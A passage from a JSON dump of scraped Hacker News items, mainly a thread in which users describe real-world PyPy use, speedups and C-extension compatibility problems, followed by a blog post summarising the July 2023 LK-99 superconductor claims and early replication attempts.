hours ago | root | parent [–] Oh god you're right.... me + joke + whoosh ;-)reply",
    "originSummary": [
      "Conduit is a chat server powered by the Matrix open network.",
      "It enables secure and decentralized communication between users on different servers.",
      "Conduit is lightweight, reliable and easy to set up.",
      "It has low system requirements and can be faster than other server implementations.",
      "Although still in beta, Conduit is usable, albeit with some missing features.",
      "The project is hosted on the Conduit website and GitLab.",
      "Server hosting is provided by the Matrix.org Foundation.",
      "Conduit was sponsored by the German BMBF for six months in 2021."
    ],
    "commentSummary": [
      "Users are comparing messaging protocols like Matrix, XMPP, Zulip, Mattermost, and Git.",
      "Installation, usage, compatibility, and features are among the factors being discussed.",
      "Concerns about data storage, encryption, privacy, and resource efficiency are also raised.",
      "Some users are confused about the purpose and implementation of Conduit."
    ],
    "points": 355,
    "commentCount": 160,
    "retryCount": 0,
    "time": 1690764691
  },
  {
    "id": 36940871,
    "title": "Is anyone using PyPy for real work?",
    "originBody": "I have been the release manager for PyPy, an alternative Python interpreter with a JIT [0] since 2015, and have done a lot of work to make it available via conda-forge [1] or by direct download [2]. This includes not only packaging PyPy, but improving on an entire C-API emulation layer so that today we can run (albeit more slowly) almost the entire scientific python data stack. We get very limited feedback about real people using PyPy in production or research, which is frustrating. Just keeping up with the yearly CPython release cycle is significant work. Efforts to improve the underlying technology needs to be guided by user experience, but we hear too little to direct our very limited energy. If you are using PyPy, please let us know, either here or via any of the methods listed in [3].<p>[0] <a href=\"https:&#x2F;&#x2F;www.pypy.org&#x2F;contact.html\" rel=\"nofollow noreferrer\">https:&#x2F;&#x2F;www.pypy.org&#x2F;contact.html</a>\n[1] <a href=\"https:&#x2F;&#x2F;www.pypy.org&#x2F;posts&#x2F;2022&#x2F;11&#x2F;pypy-and-conda-forge.html\" rel=\"nofollow noreferrer\">https:&#x2F;&#x2F;www.pypy.org&#x2F;posts&#x2F;2022&#x2F;11&#x2F;pypy-and-conda-forge.html</a>\n[2] <a href=\"https:&#x2F;&#x2F;www.pypy.org&#x2F;download.html\" rel=\"nofollow noreferrer\">https:&#x2F;&#x2F;www.pypy.org&#x2F;download.html</a>\n[3] <a href=\"https:&#x2F;&#x2F;www.pypy.org&#x2F;contact.html\" rel=\"nofollow noreferrer\">https:&#x2F;&#x2F;www.pypy.org&#x2F;contact.html</a>",
    "commentLink": "https://news.ycombinator.com/item?id=36940871",
    "commentBody": "Is anyone using PyPy for real work?304 points by mattip 3  74 commentsI have been the release manager for PyPy, an alternative Python interpreter with a JIT [0] since 2015, and have done a lot of work to make it available via conda-forge [1] or by direct download [2]. This includes not only packaging PyPy, but improving on an entire C-API emulation layer so that today we can run (albeit more slowly) almost the entire scientific python data stack. We get very limited feedback about real people using PyPy in production or research, which is frustrating. Just keeping up with the yearly CPython release cycle is significant work. Efforts to improve the underlying technology needs to be guided by user experience, but we hear too little to direct our very limited energy. If you are using PyPy, please let us know, either here or via any of the methods listed in [3].[0] https://www.pypy.org/contact.html [1] https://www.pypy.org/posts/2022/11/pypy-and-conda-forge.html [2] https://www.pypy.org/download.html [3] https://www.pypy.org/contact.htmlggm 2 hours ago | next [–] I'm using pypy to analyse 350m DNS events a day, through python cached dicts to avoid dns lookup stalls. I am getting 95% dict cache hit rate, and use threads with queue locks.Moving to pypy definitely speeded me up a bit. Not as much as I'd hoped, it's probably all about string index into dict and dict management. I may recode into a radix tree. Hard to work out in advance how different it would be: People optimised core datastructs pretty well.Uplift from normal python was trivial. Most dev time spent fixing pip3 for pypy in debian not knowing what apts to load, with a lot of \"stop using pip\" messaging.replydanpalmer 2 hours ago | parent | next [–] Debian is its own worst enemy with things like this. It’s why we eventually moved off it at a previous job, because deploying Python server applications on it was dreadful.I’m sure it’s better if you’re deploying an appliance that you hand off and never touch again, but for evolving modern Python servers it’s not well suited.replygjvc 2 hours ago | root | parent | next [–] Yes 1000x What is it with them which makes them feel entitled to have special \"dist-packages\" vs \"site-packages\" as is the default? This drives me nuts, when I have a bunch of native packages I want to bundle in our in-house python deployment. CentOS and Ubuntu are vanilla, and only Debian (mind-boggingly) deviates from the well-trodden path.I still haven't figured out how to beat this dragon. All suggestions welcome!replyeyegor 1 hour ago | root | parent | next [–] I usually make a venv in ~/.venv and then activate it at the top of any python project. Makes it much easier to deal with dependencies when they're all in one place.replygjvc 1 hour ago | root | parent | next [–] i am a big fan of .venv/ -- except when it takes ~45 mins to compile the native extension code in question -- then I want it all pre-packaged.replydgroshev 7 minutes ago | root | parent | next [–] At this stage [0], uncompiled native extensions are not yet a bug, but a definite oversight of the maintainer. They should come as precompiled wheels[0]: https://pythonwheels.comreplysynergy20 1 hour ago | root | parent | prev | next [–] second this and it's what I do on all Linux distros, just run it inside .venv as the site-installation.if you need extra dependencies that pip can not do well in the .venv case, Conda can help with its own and similar site-based installation.I don't know how it is different in the python installation case between ubuntu and debian, they seem the same to me.replysilon42 1 hour ago | root | parent | prev | next [–] dist packages are a must for software written in Python that is part of the distribution itself.replysmashed 1 hour ago | root | parent | next [–] You're not really answering why they are important?Is it because .deb packages will install inside dist-packages and when you run pip install as root without a virtual env, it installs inside site-packages?I don't really see how this helps though? Sure you won't get paths to clash between the two but you still have duplicate packages which is probably not what you want..replyrlpb 53 minutes ago | root | parent | next [–] Debian ships packages with a coherent dependency structure that crosses language boundaries. You don't need to care what language something is written in to be able to \"apt install\" it. The expectation is that if it \"apt installed\" then it should Just Work because all the required dependencies were also pulled in from Debian at the same time.Debian also tries to ship just one version of everything in a single distribution release to reduce the burden on its maintainers.This is fundamentally at odds with pip. If you've pip installed something, then that'll likely be the latest version of that package, and in the general case won't be the version of the same thing that shipped in the Debian release. If there exist debs that depend on that package and they are shared between pip and debs, now the deb could be using a different version of the dependency than the deb metadata says is acceptable, leading to breakage.Another way of putting this: it shouldn't be possible for you to pip upgrade a dependency that a deb shipped by Debian itself relies upon. Because then you'd creating a Frankenstein system where Debian cannot rely on its own dependencies providing what it expects.This is fixed by having two places where things are installed. One for what the system package manager ships, and one for your own use with pip and whatever you want to do. In this sense, having duplicate packages is actually exactly what you want.replydduong 50 minutes ago | root | parent | prev | next [–] Imagine you installed python3-requests (version x.y.z). Some of your distribution's packages depend on that specific package/version.If you pip install requests globally, you just broke a few of your distrib's packages.replybombolo 25 minutes ago | root | parent | prev | next [–] It works completely fine in my experience.replysyllogism 1 hour ago | parent | prev | next [–] If you have very large dicts, you might find this hash table I wrote for spaCy helpful: https://github.com/explosion/preshed . You need to key the data with 64-bit keys. We use this wrapper around murmurhash for it: https://github.com/explosion/murmurhashThere's no docs so obviously this might not be for you. But the software does work, and is efficient. It's been executed many many millions of times now.replymattip 2 hours ago | parent | prev | next [–] > it's probably all about string index into dict and dict managementCool. Is the performance here something you would like to pursue? If so could you open an issue [0] with some kind of reproducer?[0] https://foss.heptapod.net/pypy/pypy/-/issuesreplyreftel 2 hours ago | prev | next [–] I use it at work for a script that parses and analyzes some log files in an unusual format. Wrote a naive parser with a parsing combinator library. It was too slow to be usable with CPython. Tried PyPy and got a 50x speed increase (yes, 50 times faster). Very happy with the results, actually =)replymattip 1 hour ago | parent | next [–] Thanks for the feedback. It does seem like parsing logs and simulations is a sweet spot for PyPyreply_aavaa_ 1 hour ago | root | parent | next [–] Simulations are, at least in my experience, numba’s [0] wheelhouse.[0]: https://numba.pydata.org/replyzzzeek 35 minutes ago | parent | prev | next [–] what cpython version and OS was that? I'd be very surprised if modern Python 3.11 has anything an order of magnitude slower like that. things have gotten much faster over the years in cpythonreplymacNchz 1 hour ago | prev | next [–] I put PyPy in production at a previous job, running a pretty high traffic Flask web app. It was quick and pretty straightforward to integrate, and sped up our request timings significantly. Wound up saving us money because server load went down to process the same volume of requests, so we were able to spin down some instances.Haven’t used it in a bit mostly because I’ve been working on projects that haven’t had the same bottleneck, or that rely on incompatible extensions.Thank you for your work on the project!replymattip 1 hour ago | parent | next [–] You're welcome.> that rely on incompatible extensions.Which ones? Is using conda an option, we have more luck getting binary packages into their build pipelines than getting projects to build wheels for PyPIreplymacNchz 46 minutes ago | root | parent | next [–] I can't actually remember off of the top of my head, I tried it out a year or two ago but didn't get too far because during profiling it became clear the biggest opportunities for performance improvement in this app were primarily algorithmic/query/io optimizations outside of Python itself, so business-wise it didn't make too much sense, though if it had I think using Conda would have been on the table. We make heavy use of Pandas/Numpy et al, though I know those are largely supported now so I'd guess it was not one of them but something adjacent.replyPaulHoule 2 hours ago | prev | next [–] I use CPython most of the time but PyPy was a real lifesaver when I was doing a project that bridged EMOF and RDF, particularly I was working with moderately sized RDF models (say 10 million triples) with rdflib.With CPython, I was frustrated with how slow it was, and complained about it to the people I was working with, PyPy was a simple upgrade that sped up my code to the point where it was comfortable to work with.replymark_l_watson 1 hour ago | parent | next [–] That is a great idea! I use rdflib frequently and never thought to try it with PyPy. Now I will.replymattip 2 hours ago | parent | prev | next [–] Is your group still using it?replynickpsecurity 2 hours ago | parent | prev | next [–] What do you use RDF models for?replymkl 3 hours ago | prev | next [–] You should probably put \"Ask HN:\" in your title.Personally I don't use PyPy for anything, though I have followed it with interest. Most of the things I need to go faster are numerical, so Numba and Cython seem more appropriate.reply1equalsequals1 29 minutes ago | parent | next [–] Cut him some slack, he's only been registered for 10 yearsreplypdw 2 hours ago | prev | next [–] We don't. To be honest, I didn't realize PyPy supported Python 3. I thought it was eternally stuck on Python 2.7.So the good: It apparently now supports Python 3.9? Might want to update your front page, it only mentions Python 3.7.The bad: It only supports Python 3.9, we use newer features throughout our code, so it'd be painful to even try it out.replyeyegor 1 hour ago | parent | next [–] Their docs seem perpetually out of date, but they recently released support for 3.10. I haven't been able to try it recently because our projects use 3.10 features but in the past it was easily a 10-100x speedup as long as all the project's libraries worked.https://downloads.python.org/pypy/replymattip 1 hour ago | parent | prev | next [–] It supports Python3.10 now too. Thanks, I updated the site.replyADcorpo 1 hour ago | parent | prev | next [–] I think it supports up to 3.10, as there are official docker images for this version, I saw them this morning.Maybe the site is not up to date ?replyq3k 3 hours ago | prev | next [–] I use PyPy quite often as a 'free' way to make some non-numpy CPU-bound Python script faster. This is also the context for when I bring up PyPy to others.The biggest blocker for me for 'defaulting' to PyPy is a) issues when dealing with CPython extensions and how quite often it ends up being a significant effort to 'port' more complex applications to PyPy b) the muscle memory for typing 'python3' instead of 'pypy3'.replynicce 2 hours ago | parent | next [–] For the b) part, you should consider creating alias for that command, if it really might lead for you to not use it otherwise.replymark_l_watson 1 hour ago | root | parent | next [–] I had the same thought. For years I have aliased ‘p’ for ‘python’ and after reading this thread I will alias ‘pp’ for ‘pypy’.replyrsecora 1 hour ago | prev | next [–] I use it for data transformation, cleanup and enrichment. (TXT, CSV, Json, XML, database) to (TXT, CSV, JSON, XML, database).Speed up of 30x - 40x. The highest speedup on those that require logic in the transformation. (lot of function calls, numerical operations and dictionary lookups).replycaptn3m0 1 hour ago | parent | next [–] Similar. I was working on some ETL work with SQLite, and now PyPy is my regular tool for getting better performance at similar jobs.replytwp 1 hour ago | prev | next [–] Yes. We have a legacy Python-based geospatial data processing pipeline. Switching from CPython to PyPy sped it up by a factor of 30x or so, which was extremely helpful.Thank you for your amazing work!replycpburns2009 29 minutes ago | prev | next [–] We use PyPy extensively at my employer, a small online retailer, for the website, internal web apps, ETL processes, and REST API integrations.We use the PyPy provided downloads (Linux x86 64 bit) because it's easier to maintain multiple versions simultaneously on Ubuntu servers. The PyPy PPA does not allow this. I try to keep the various projects using the latest stable version of PyPy as they receive maintenance, and we're currently transitioning from 3.9/v7.3.10 to 3.10/v7.3.12.Thank you for all of the hard work providing a JITed Python!replymattip 24 minutes ago | parent | next [–] Cool. Would love to hear more about the successes and problems, or even get a guest blog post on https://www.pypy.org/blog/replyADcorpo 2 hours ago | prev | next [–] This post is a funny coincidence as I tried today to speed-up a CI pipeline running ~10k tests with pytest by switching to pypy.I am still working on it but the main issue is psycopg support for now, as I had to install psycopg2cffi in my test environment, but it will probably prevent me from using pypy for running our test suite, because psycopg2cffi does not have the same features and versions as psycopg2. This means either we switch our prod to pypy, which won't be possible because I am very new in this team and that would be seen as a big, risky change by the others, or we keep in mind the tests do not run using the exact same runtime as production servers (which might cause bugs to go unnoticed and reach production, or failing tests that would otherwise work on a live environment).I think if I ever started a python project right now, I'd probably try and use pypy from the start, since (at least for web development) there does not seem to be any downsides to using it.Anyways, thank you very much for your hard work !replytlocke 30 minutes ago | parent | next [–] I work on pg8000 https://pypi.org/project/pg8000/ which is a pure-Python PostgreSQL driver that works well with pypy. Not sure if it would meet all your requirements, but just thought I'd mention it.replycpburns2009 19 minutes ago | parent | prev | next [–] If you use recent versions of PostgreSQL (10+ I believe) you can use psycopg3 [1] which has a pure Python implementation which should be compatible with PyPy.[1]: https://www.psycopg.org/psycopg3/docs/basic/install.htmlreplyjsmeaton 1 hour ago | parent | prev | next [–] Second this - no psycopg2 support and to a lesser extent lxml is a nonstarter and makes it pretty difficult to experiment with on production code bases. I could see a lot of adoption from Django deployments otherwise.replysodimel 1 hour ago | root | parent | next [–] Yeah we don't use pypy for those exact reasons on our small django projects.replyApreche 1 hour ago | prev | next [–] I don’t actually use PyPY, but I’m very aware of it. My understanding is that the only reason to use PyPy instead of the default Python is for performance gains. For the vast majority of projects I work on, the performance of our code on the CPU is almost never the bottleneck. The slowness is always in IO, databases, networks, etc.That said, if I do ever run into a situation where I need my code to perform better, PyPy is high on my list of things to try. It’s nice to know it’s an option.replybofaGuy 1 hour ago | prev | next [–] My biggest issue is that DataDog doesn’t support PyPy. Out of curiosity, I made a new branch of our app and took out DataDog and observed a significant improvement in performance when using PyPy vs CPython on the same branch (but can’t remember how much).replywiz21c 2 hours ago | prev | next [–] I don't use PyPy because when I'm stuck with performance issues, I go to numpy and if it really doesn't work I go to cython/numba (because it means that 99% of my python code continue to work the same, only the 1% that gets optimized is different; if I'd go PyPy, I'd have to check my whole code again). I do mostly computational fluid dynamics.(nevertheless, PyPy is impressive :-) )replywg0 1 hour ago | prev | next [–] While the community is here, anyone has embedded pypy as scriptable language for some larger program? Like Inkscape or scripting as part of a rule engine. Or for that, CPython is more suitable?replymattip 1 hour ago | parent | next [–] It is much easier to embed CPython, PyPy can only be embedded via CFFI [0].[0] https://cffi.readthedocs.io/en/latest/embedding.htmlreplywaysa 2 hours ago | prev | next [–] I used PyPy with SymPy when I was helping out a mathematician-friend. SymPy is not exactly fast, a free performance boost was very welcome.replymattip 1 hour ago | parent | next [–] Interesting. I was under the impression PyPy did not do so well with SymPy because the dynamic code paths are difficult to JIT. What kind tasks waw a speed up?replyt90fan 2 hours ago | prev | next [–] I can't remember exactly what the use case was but we used at my old work (Start up providing a Web CDN/WAF type service, think the kind of stuff CloudFlare does nowadays) in ~2013 for some sort of batch processing analytics/billing type job, using MRJob and AWS Elastic Map Reduce over a seriously large data set.The performance of PyPy over CPython saved us loads and loads time and thus $$$s, from what I can recall.replymattip 2 hours ago | parent | next [–] Thanks, that is hopeful, although quite a while ago.reply_han 1 hour ago | prev | next [–] I didn't hear about PyPy before, but I think you're doing great work.I would be interested in seeing benchmarks where PyPy is compared with more recent versions of CPython. https://www.pypy.org/ currently shows a comparison with CPython 3.7, but recent releases of CPython (3.11+) put a lot of effort into performance which is important to take into account.replyclaytonjy 45 minutes ago | prev | next [–] Can someone ELI5 why pypy doesn't or can't work with C-based packages like numpy or psycopg? I know nothing of how pypy does its magic.If we could use pypy, while still using those packages, I think it'd be the go-to interpreter. Why can't pypy optimize everything else, and leave the C stuff as-is?How does pypy handle packages written in other languages, like rust? can I use pypy if I depend on Pydantic?replylapinot 14 minutes ago | parent | next [–] Basically afaik the default C API (`Python.h`) is matched to CPython's internal representations, hence it's a pain to support it for alternative implementations and incurs cost penalties. The preferred way to interact with C code in pypy is through cffi (https://cffi.readthedocs.io/en/latest/) and ctypes (which afaik is implemented in pure python on top of cffi in pypy).Numpy being itself written in C and C++ it is strongly tied to the C API and has a complicated build process. Some stuff works and some don't (didn't try recently). If you're invested in numerical python you should most likely not use pypy but go for stuff like cython (like scipy does).For psycopg apparently you can use psycopg2cffi (never tried).> How does pypy handle packages written in other languages, like rust? can I use pypy if I depend on Pydantic?PyO3 supports pypy so everything should be fine.replymattip 28 minutes ago | parent | prev | next [–] Lots of questions :)For c-extensions see https://www.pypy.org/posts/2018/09/inside-cpyext-why-emulati...We would like to be able to \"just JIT\" better. But for that we need feedback about what is still unreasonably slow, and resources to work on improving it. Right now PyPy is on a shoe-string budget of volunteers.For rust, like CPython, use PyO3, which works with PyPy.I am not sure about Pydantic. Sounds like a topic for someone to investigate on their codebase and tell us how PyPy does.replyahallan 1 hour ago | prev | next [–] I've used it at work to speed up some standard Python code (without any c-bound library usage). It sped up the code by 5 times.I've deployed used the pypy:3.9 image on docker.One thing I did notice is that it was significantly faster on my local machine vs when I tried to deploy it using an AWS lambda/fargate. I know this is because of virtualization/virtual-cpu, but there was not much I could do to improve it.replylsferreira42 1 hour ago | prev | next [–] I'm building a bot detector api to use with our CDN and using pypy was decided on day one, without pypy the performance is just not there.Also in my day job we use pypy in all our python deployments, to be fair until now I thought that everybody would develop in python, test in pypy for an easy speed boost and only got back to python if pypy was slower than cpythonreplypyuser583 1 hour ago | prev | next [–] I don’t use it, but I’d like to.The big obstacle is that for while we would have multiple execution environments. It’s not like we could flip a switch and all Dockerfiles are using PyPy.Plus I don’t think AWS Lambda supports it.If I could go back in time, we would use it from the beginning.replyideasman42 1 hour ago | prev | next [–] If it was relatively up to date with Python3 I'd use it, but as it lags behind considerably I avoid it, even for personal work.replymattip 1 hour ago | parent | next [–] Python 3.10 is too old for your work?replyideasman42 1 hour ago | root | parent | next [–] In fact no, Python 3.10 is OK new enough.There is still the lag though, Python 3.10 was out for quite a while before PyPy supported 3.10.replygaryrob 2 hours ago | prev | next [–] I've never ended up using PyPy other than to play with it. Numba has worked very well for me for real code.replykzrdude 2 hours ago | prev | next [–] I wonder if programs like Rye, that distribute python in a way similar to Rust's rustup, can help. Rye already supports pypy, you can just pull down pypy3.9 at will into any particular python project managed by rye.replyant6n 1 hour ago | prev | next [–] When I worked at Transit App, I built a backend pre-processing pipeline to compress transit and osm data in python [1] and also another pipeline to process transit map data in python [2]. Since the Ops people complained about how long it took to compress the transit feeds (I think London took 10h each time something changed), I migrated everything to Pypy. Back then that was a bit annoying cuz it meant I had to remove numpy as a requirement, but other than that there were few issues. Also it meant we were stuck on 2.7 for quite a while, so long that I hadnt prepared a possible migration to 3.x. The migration happened after I left. Afaik they still use pypy.Python is fun to work with (except classes…), but its just sooo slow. Pypy can be a life saver.[1] https://blog.transitapp.com/how-we-shrank-our-trip-planner-t... [2] https://blog.transitapp.com/how-we-built-the-worlds-pretties...replyPartiallyTyped 1 hour ago | prev | next [–] Hey, you might want to delete the link to https://mesapy.org/rpython-by-example in https://doc.pypy.org/en/latest/architecture.html as it is pointing to a resource that people are unable to access.replymattip 1 hour ago | parent | next [–] Thanks, that should have been https://mssun.github.io/rpython-by-example/index.html. Fixing.replyIshKebab 2 hours ago | prev | next [–] I've never used it because the (unknown) effort of switching and the chance of compatibility issues have always made it unappealing compared to just switching to a faster language.If I could just `pip3 install pypy` and then set an environment variable to use it or something like that then I'd give it a try. It does feel a bit like adding a jet pack to a rowing boat though. I know some people use Python in situations where the performance requirement isn't \"I literally don't care\" but surely not very many?Obviously if it was the default that would be fantastic.replyJimDabell 40 minutes ago | parent | next [–] If you use a version manager like rtx or asdf then it’s basically that simple. I just had to run a single command:rtx use python@pypy3.10This downloaded and installed PyPy v3.10 in a few seconds and created an .rtx.toml file in the current directory that ensures when I run python in that directory I get that version of PyPy.replyandrewstuart 2 hours ago | prev | next [–] I’ve been aware of it for a long time.I don’t use it.Why would I use it, what’s the compelling benefit?replybayindirh 2 hours ago | parent | next [–] Errm, nothing too serious. It's way faster for CPU bound code, and allows micro-threads.This two weird tricks tend to create wonders, tho.replyADcorpo 2 hours ago | parent | prev | next [–] From the project's homepage:> A fast, compliant alternative implementation of PythonPerformance without compromising too much on compatibility seems to be the main benefit. There is a talk on the YouTube channel «Pycon Sweden» from 5 years ago where the host showed some impressive speed gains for his workload (parsing black box dumps from planes).replyceeam 2 hours ago | prev [–] I liked Psyco a lot, it was totally awesome and with very few bugs (CPython differences) but that was looong ago. PyPy looks and feels like a monstrosity, it builds longer than most software for once, which is off-putting. I would be more interested in a Python JIT which is more like LuaJIT to Lua.reply",
    "originSummary": [
      "The release manager for PyPy is seeking feedback from users on their experience using the alternative Python interpreter with a JIT compiler.",
      "Efforts have been made to make PyPy accessible through various methods.",
      "Compatibility with the scientific Python data stack has been enhanced.",
      "Users are encouraged to provide feedback to help guide future improvements.",
      "Listed methods for providing feedback are available."
    ],
    "commentSummary": [
      "PyPy is an alternative Python interpreter with a Just-in-Time compiler that can improve performance in Python programs.",
      "Users have shared their experiences and opinions on the benefits of using PyPy, such as analyzing DNS events, parsing log files, and reducing server load.",
      "Compatibility issues with CPython extensions, outdated documentation, and limited support for certain libraries are raised as concerns.",
      "Users also discuss alternative options to PyPy and the challenges of deploying it.",
      "Overall, while PyPy can enhance performance, it may not be suitable for all use cases due to its drawbacks."
    ],
    "points": 304,
    "commentCount": 74,
    "retryCount": 0,
    "time": 1690800818
  },
  {
    "id": 36940323,
    "title": "LK-99: The Live Online Race for a Room-Temperature Superconductor",
    "originLink": "https://eirifu.wordpress.com/2023/07/30/lk-99-superconductor-summary/#sbtable",
    "originBody": "Skip to contentEiri Sanada~ The Frozen Flame (Blog) ~ [ Portfolio / CV ] [ About ] Twitter Patreon Youtube LK-99: The Live Online Race for a Room-Temperature Superconductor (Summary)Disclaimer: I’m not a materials scientist. I may update this over time as I collate more information. Updated 2023-07-31 – Spacebattles table (11 online replication efforts) Added a personal note about the rapid online response.On 22 July 2023, two mysterious papers were suddenly published in arxiv.org – this is a website of scientific papers that is often the first step to peer-reviewed publication, but it’s not a total confirmation. They were published about two hours apart – the first one, with three authors credited, claims to have created the world’s first room-temperature-and-pressure (RTP) superconductor.This first paper is short and appears to be hastily written, and has three authors attached: Sukbae Lee, Ji-Hoon Kim, Young-Wan Kwon.The second paper is much more detailed, though there are some signs it that was still pushed out a bit quickly. However, even more curiously, it has six authors: Sukbae Lee, Jihoon Kim, Hyun-Tak Kim, Sungyeon Im, SooMin An, and Keun Ho Auh. The third author of the first paper is removed from the second.The purported properties of the material labeled “LK-99” are incredible. Originally synthesised in 1999, not only is it RTP, but the critical temperature is actually 127°C – above the boiling temperature of water. The synthesis method is also shockingly simple: Finely grind and mix Lanarkite (Pb2(SO4)O) and Copper Phosphide (Cu3P) and bake it at 925°C in a vacuum chamber for a day. The ability to discover and synthesise it has theoretically been available since the industrial revolution. Now, one should be able to do it in a garage or home lab.The reaction online is a rapid mix of skepticism and curiosity. Fraudulent claims have occurred before – the previous one claimed it required 10,000 atm, as a deliberate delay to independent verification. That doesn’t exist here. The authorship is also curious: The main authors are experts in superconductivity and magnetic research. It is widely noted that only a maximum of three people can recieve a Nobel Prize. Was the first paper a deliberate attempt to flag themselves as the finders?Young-Wan Kwon, the removed author from the first paper, crashes a science conference several days later and talks about the discovery. He couldn’t demonstrate a sample, and was apparently expelled from the science group months ago. Is this a sign of treachery? In-fighting for credit? It makes the whole thing pass the sniff test. Many of us may not believe it yet, but they certainly do. What else could make an expert behave like that?As I begin writing this post on 30 July, the live reaction – and attempts to replicate it – has been developing day-by-day on the scientific community on Twitter. A space engineering startup in the Los Angeles area coincidentally has all the tools on-hand and available, and quickly orders the materials and blogs about the day-by-day progress of synthesis. A Korean user fluent in English begins translating news from Korean newspapers and internet forums. A Chinese user does the same for Chinese social media. Scientists who maintain an online presence begin explaining the implications and dissect the paper. Someone begins compiling key figures acting as information sources across language barriers.The magic of room-temperature superconductors is something that shows up in sci-fi, and is easily understood at the high-school physics level. But having most of these ongoing news break on Twitter… well, I’m not a heavy user of Twitter, but I never quite figured out a good way to track an event after it has occured. It’s very good for a live feed, but it gets rather scattered if you’re trying to catch up. This post is just my way of making sense of the key opening events.Is it nothing? Is it less than expected? At the very least, there’s a lot of buzz right now. At the very least, I might stick additional events in chronological order below the next couple of separator lines.What’s the Big Deal?If you need a quick high-school physics primer, here’s the deal:A superconductor is an electrical conductor with zero resistance. It was first discovered when it was found that resistance drops with temperature, and for some reason, instead of dropping in a curve, some materials immediately drop to zero resistance when they pass a certain point, called the ‘critical temperature’. Zero resistance means that no heat is generated when electricity passes through; in other words, the wire is 100% efficient and energy is not lost over distance, and there’s no heat generation at super-high voltages. The caveat is that the temperature for most of these needs to be way below -200°C. You still need to spend a lot of energy keeping it cool, but the heat doesn’t come from the electricity.The general result is that any device using superconducting material – such as MRI machines – are bulky and immobile, due to the constant need for cryogenics. A room-temperature superconductor allows for things like an infinitely long power cable without loss, or a portable MRI scanner.A Rough History of Original Synthesis to the PaperBased on the investigation by this user, Sukbae Lee and Jihoon Kim originally found the material in 1999 – thus the label “LK-99”. They were in graduate school at the time, and their mentor was also an expert in this area, theorising that there were signs of superconductivity in this, but required more research. They seem to shelve the whole thing due to the nature of graduate school.Fast-forwarding to 2017, Lee & Kim have scientific careers, and are called back by their mentor, who encourages them to complete the research. However, without any backing – particularly on the English-speaking international level – they work with Young-Wan Kwon and somehow acquire funding.By 2022 and early 2023, patents are filed. Something happens with Kwon, and he appears to publish the first paper without warning.The Third PaperIn one of the citations for the detailed paper, one of the citations is one of their own papers published several months prior about the theoretical causes of superconductivity in LK-99. The paper is written in Korean, though there is an abstract in English: The general idea is that a one-dimensional electron structure could explain the high temperature superconductivity of the material, which has a critical temperature of at least over 97°C.(I’m not a materials scientist so don’t expect a good explanation.)Online Claims / Liveblogged replication effortsThis started as a copy of Guderian2nd’s table on the discussion thread on Spacebattles with a bit of cleanup and more cross-linking. I’ve rewritten most of their notes to be more concise and added my own, but you can probably check either one on a day-to-day basis.Academia Group Country Status Results Notes Sources Argonne National Laboratory USA ??? ??? Replication is ongoing. According to a request for comment, a theorist at Argonne says “They come off as real amateurs. They don’t know much about superconductivity and the way they’ve presented some of the data is fishy.” Science.org School of Physics, Nanjing University China ??? ??? The article is mostly a summary of initial events and some reaction and skepticism from the scientific world, as well as educating the reader on superconductivity and its qualifiers. Physics Professor Wen Haihu says that the data is not convincing, but a colleague was sent to work on it. ScienceNet.cn Huazhong University of Science and Technology (HUST) China Retrying 1: Partial 2: Partial 3: TBD Only source are screenshots of WeChat. Translation by Elsa Zhou says that it seems legitimate: Twitter Thread or Medium Some magnetic qualities have been replicated, but no Meissner effect. Low purity is suspected. Zhihu Institute of Physics – Chinese Academy of Sciences (IoP-CAS) China  ??? Unsubstantiated claims of success or failure were made immediately after the story broke. However, official accounts say they are not aware of any replication attempts. Zhihu_1 Zhihu_2 Zhihu_3 Council Of Scientific And Industrial Research – National Physical Laboratory of India (CSIR-NPLI) India Retrying 1: Fail 2: Fail Dr. V.P.S. Awana from CSIR-NPLI posted their results on his personal Facebook. 1st attempt used an altered recipe with theoretically the same result, but failed. 2023-07-31: 2nd attempt of a bulk sample is also inconclusive. Facebook_1 Facebook_2 Imgur mirror Individual / Private Individual Country Credentials Status Results Notes Sources Andrew McCalip @ Twitter USA Engineer at Varda Synthing Cu3P TBD He’s liveblogging his progress on Twitter and also streaming the furnace burn on Twitch when possible. (If the stream is offline, may I suggest watching paint dry?) As of 2023-07-31, he is waiting for the Copper Phosphide synthesis from partners. (Red phosphorus cannot be obtained on short notice from a new customer in the USA due to DEA restrictions.) TwitterDay2 TwitterDay2.5 TwitterDay4 Twitch 半导体与物理 @ Zhihu China ??? Testing TBD This person was regularly posting screenshots of their synthesis procedure on a forum thread. Zhihu 胡豆 @ Zhihu China ??? Synthing Cu3P TBD This person was also regularly posting screenshots of their synthesis procedure on a forum thread. Zhihu 关山口男子技师 @ Bilibili China Claims to work at HUST Complete 1-4: Fail Claims that they are from HUST. Livestreamed/posted video on 4 sample experiments. All 4 samples failed to display any magnetic reaction – however, they close the experiment by saying that 4 independent tests don’t override the sample sizes of the original paper. Bilibili_1 Bilibili_2 Bilibili_3 Twitter amita @ Zhihu ??? ??? Complete Fail This user is only writing a forum post with second-hand reporting. There is apparently another failure somewhere, but there are also references to the bilibili streamer above (the one with the 4 samples). Zhihu Iris Alexandra @ Twitter Russia ??? Testing Partial This is a new personal Twitter user (April 2023) with a descriptor of “resident plant physiology and method refinement nerd.” They have criticised the synthesis method of the Lanarkite and Copper Phosphide and used an alternate method for it. They have produced a grain of material with levitating properties. Twitter_1 Twitter_2 Twitter_3 It’s Over / It’s Not Over: The online rollercoaster of emotionThis is a short personal note for readers, where I would like to point out that scientific research is never a yes/no confirmation. It is a gradual move towards a 0% or 100% (but never getting there) as more data is obtained, and more and more scientists try variations and refinements.Since this is a physical material and not a piece of software that can be instantly installed, one must also consider that ingredients need to be ordered, shipped, recieved, and processed over time. People need sleep. Korea, Japan, Australia, Europe and America are all in different timezones. People have jobs. I have no specific tweet to point at, but I have seen some occasional criticism of the current buzz to this effect. Things move quickly, and I only have a certain amount of time to check and update things, as does everyone else.Timeline?Note: Everything below this line may not be useful and may be edited later22 July 2023: The two papers are uploaded to arxiv.org. The first one is short and reads like a popular science article. The second one is more elaborate.23 July 2023:24 July 2023:25 July 2023:26 July 2023: Andrew McCalip shares that he has all the neccessary tools at his company. He can’t quickly obtain red phosphorus due to regulations, but manages to contact another local lab that can immediately synthesise the Copper Phosphide. Hyun-Tak Kim, an author on the second paper, contacts New Scientist and27 July 2023: Andrew McCalip begins construction for synthesis. 28 July 2023:29 July 2023: On WeChat (Chinese social media), claims of replication of some of the properties are made. However, the Meissner effect (levitation) is not observed. Since this is a first attempt, the current belief is that the material was not synthesised to sufficiently high quality.30 July 2023: Scientists and communicators on Twitter organise a discussion space to synchronise all the developments so far.Share this: TwitterFacebook Posted by EiriJuly 